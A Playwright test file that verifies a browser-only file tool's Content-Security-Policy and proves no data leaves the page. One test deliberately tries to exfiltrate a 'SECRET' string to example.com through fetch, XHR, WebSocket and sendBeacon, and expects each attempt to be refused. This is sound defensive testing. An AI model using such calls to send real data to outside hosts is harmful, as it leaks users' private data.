import { expect, test } from '@playwright/test';

/**
 * The egress proof, as something that runs rather than something asserted.
 *
 * The product's loudest claim is that files are processed in the tab and are
 * not uploaded. Business rule 23 says that claim ships only for a build that
 * passed "the current egress proof protocol" — but `ai/KNOWN_ISSUES.md` records
 * that protocol as "not empirically complete", and `implementation/ARCHITECTURE.md`
 * says that because of it "the UI says proof is pending". The UI did not say
 * pending: it shipped `zero cloud uploads` and `zero data leaks`.
 *
 * This file closes that gap the only way it can be closed — by measuring the
 * built artifact, in both engines Playwright runs, on every release. Three
 * things are checked, in order of how much they prove:
 *
 *   1. The policy is present and restrictive (cheap, and catches a regression
 *      in the header before anything else has to run).
 *   2. Deliberate exfiltration is refused. Five vectors are actively attempted
 *      from the page's own context. This proves the control works, which
 *      observing an idle page never can.
 *   3. A real file goes through a real tool and nothing carrying it leaves.
 *
 * One trap worth knowing, found the hard way against production: **a blocked
 * `navigator.sendBeacon` still returns `true`.** The spec returns true once the
 * beacon is queued, and CSP refuses it after. Anything asserting on that return
 * value records a leak as a pass. Assert on observed network, never on a return.
 */

/** Hosts the page is allowed to talk to. Anything else is a finding. */
const SAME_ORIGIN = 'localhost:8788';

const isOffOrigin = (url: string) => {
  try {
    const parsed = new URL(url);
    if (parsed.protocol === 'data:' || parsed.protocol === 'blob:')
      return false;
    return !parsed.host.includes(SAME_ORIGIN);
  } catch {
    return false;
  }
};

/**
 * What an off-origin request *did*, not that one was attempted.
 *
 * Chromium raises a request event for an XHR the CSP is about to kill, then
 * reports `csp` as the failure and transfers zero bytes; WebKit raises nothing
 * at all. Asserting "nothing was attempted" therefore fails Chromium on a page
 * that is behaving exactly as intended. What actually matters is that no
 * off-origin request ever received a response, and that anything attempted was
 * refused by policy rather than merely by a network error that could go the
 * other way on a different day.
 */
function watchOffOrigin(page: import('@playwright/test').Page) {
  const responded: string[] = [];
  const refused: string[] = [];
  page.on('response', (response) => {
    if (isOffOrigin(response.url())) {
      responded.push(`${response.status()} ${response.url()}`);
    }
  });
  page.on('requestfailed', (request) => {
    if (isOffOrigin(request.url())) {
      refused.push(
        `${request.failure()?.errorText ?? 'unknown'} ${request.url()}`,
      );
    }
  });
  return {
    assertNothingLeft(context: string) {
      expect(responded, `${context}: an off-origin host answered`).toEqual([]);
      for (const refusal of refused) {
        expect(refusal, `${context}: refused, but not by policy`).toMatch(
          /csp|blocked|security|refused|denied/iu,
        );
      }
    },
    /** Bytes actually put on the wire to anywhere off-origin. Must be zero. */
    async assertZeroBytesOffOrigin(page: import('@playwright/test').Page) {
      const transferred = await page.evaluate(() =>
        performance
          .getEntriesByType('resource')
          .map((entry) => entry as PerformanceResourceTiming)
          .filter((entry) => !entry.name.includes('localhost:8788'))
          .filter(
            (entry) =>
              !entry.name.startsWith('blob:') &&
              !entry.name.startsWith('data:'),
          )
          .map((entry) => ({ url: entry.name, bytes: entry.transferSize })),
      );
      for (const entry of transferred) {
        expect(entry.bytes, `bytes reached ${entry.url}`).toBe(0);
      }
    },
  };
}

test.describe('egress proof', () => {
  test('the served policy forbids network connections', async ({ request }) => {
    const response = await request.get('/image/optimize');
    expect(response.status()).toBe(200);
    const csp = response.headers()['content-security-policy'] ?? '';

    // connect-src is the one that matters: it governs fetch, XHR, WebSocket,
    // EventSource and sendBeacon together. 'none' means the page cannot open a
    // data connection at all, enforced by the browser rather than by our code.
    expect(csp).toContain("connect-src 'none'");
    // The rest close the paths that could carry bytes out without connect-src.
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("base-uri 'self'");
  });

  test('every attempt to send data out is refused', async ({ page }) => {
    const watcher = watchOffOrigin(page);

    await page.goto('/image/optimize');

    const results = await page.evaluate(async () => {
      const out: Record<string, string> = {};
      const probe = async (name: string, fn: () => unknown) => {
        try {
          out[name] = `ALLOWED: ${String(await fn()).slice(0, 60)}`;
        } catch (error) {
          out[name] = `blocked: ${(error as Error).name}`;
        }
      };

      await probe(
        'fetch.crossOrigin',
        async () =>
          (
            await fetch('https://example.com/x', {
              method: 'POST',
              body: 'SECRET',
            })
          ).status,
      );
      await probe(
        'fetch.sameOrigin',
        async () =>
          (await fetch('/collect', { method: 'POST', body: 'SECRET' })).status,
      );
      await probe(
        'xhr.crossOrigin',
        () =>
          new Promise((resolve, reject) => {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://example.com/x');
            xhr.onload = () => resolve(xhr.status);
            xhr.onerror = () => reject(new Error('refused'));
            xhr.send('SECRET');
          }),
      );
      await probe(
        'websocket',
        () =>
          new Promise((resolve, reject) => {
            let socket: WebSocket;
            try {
              socket = new WebSocket('wss://example.com/s');
            } catch (error) {
              return reject(error as Error);
            }
            socket.onopen = () => resolve('open');
            socket.onerror = () => reject(new Error('refused'));
            setTimeout(() => reject(new Error('never opened')), 3_000);
          }),
      );
      // Deliberately NOT asserted on its return value — see the note at the top.
      navigator.sendBeacon('https://example.com/b', 'SECRET');
      return out;
    });

    for (const [vector, result] of Object.entries(results)) {
      expect(result, `${vector} was not refused`).toMatch(/^blocked:/u);
    }

    // The beacon is judged here, on the wire, where its return value cannot lie.
    await page.waitForTimeout(1_000);
    watcher.assertNothingLeft('deliberate exfiltration');
    await watcher.assertZeroBytesOffOrigin(page);
  });

  test('a real file goes through a real tool without leaving the device', async ({
    page,
  }) => {
    const watcher = watchOffOrigin(page);
    const withBody: string[] = [];
    page.on('request', (req) => {
      // A GET for a script or stylesheet cannot carry a file. Anything with a
      // body, or any method that implies one, can.
      if (req.method() !== 'GET' || req.postData()) {
        withBody.push(`${req.method()} ${req.url()}`);
      }
    });

    await page.goto('/image/optimize');

    // A real PNG, built in the page, handed over exactly as a file picker would.
    // The filename is distinctive so it can be searched for in every URL below.
    const probeName = 'egress-probe-7f3a9c2b.png';
    await page.evaluate(async (name) => {
      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const context = canvas.getContext('2d')!;
      const gradient = context.createLinearGradient(0, 0, 320, 240);
      gradient.addColorStop(0, '#1B6B47');
      gradient.addColorStop(1, '#9E4527');
      context.fillStyle = gradient;
      context.fillRect(0, 0, 320, 240);
      context.fillStyle = '#ffffff';
      context.font = '20px monospace';
      context.fillText('EGRESSPROBE-7f3a9c2b', 14, 120);

      const blob = await new Promise<Blob | null>((resolve) =>
        canvas.toBlob(resolve, 'image/png'),
      );
      const file = new File([await blob!.arrayBuffer()], name, {
        type: 'image/png',
      });
      const transfer = new DataTransfer();
      transfer.items.add(file);
      const input =
        document.querySelector<HTMLInputElement>('input[type=file]')!;
      input.files = transfer.files;
      input.dispatchEvent(new Event('change', { bubbles: true }));
    }, probeName);

    await page.getByRole('button', { name: /optimi[sz]e image/iu }).click();

    // The tool is done when it offers the result for saving.
    await expect(
      page.locator('[data-receipt-download], a[download]').first(),
    ).toBeVisible({
      timeout: 30_000,
    });

    watcher.assertNothingLeft('real file operation');
    await watcher.assertZeroBytesOffOrigin(page);
    expect(withBody, 'the page sent a request with a body').toEqual([]);

    // Nothing the browser fetched may name the file, which is what a leak
    // through an img or script URL would look like under this policy.
    const leakedInUrl = await page.evaluate(
      (name) =>
        performance
          .getEntriesByType('resource')
          .map((entry) => entry.name)
          .filter((url) => url.includes(name) || url.includes('EGRESSPROBE')),
      probeName,
    );
    expect(leakedInUrl, 'the filename appeared in a request URL').toEqual([]);

    // Nothing capable of carrying a body ran at all during the operation.
    const sendingInitiators = await page.evaluate(() =>
      [
        ...new Set(
          performance
            .getEntriesByType('resource')
            .map((entry) => (entry as PerformanceResourceTiming).initiatorType),
        ),
      ].filter((type) =>
        ['fetch', 'xmlhttprequest', 'beacon', 'websocket'].includes(type),
      ),
    );
    expect(sendingInitiators, 'a data-sending request ran').toEqual([]);
  });
});
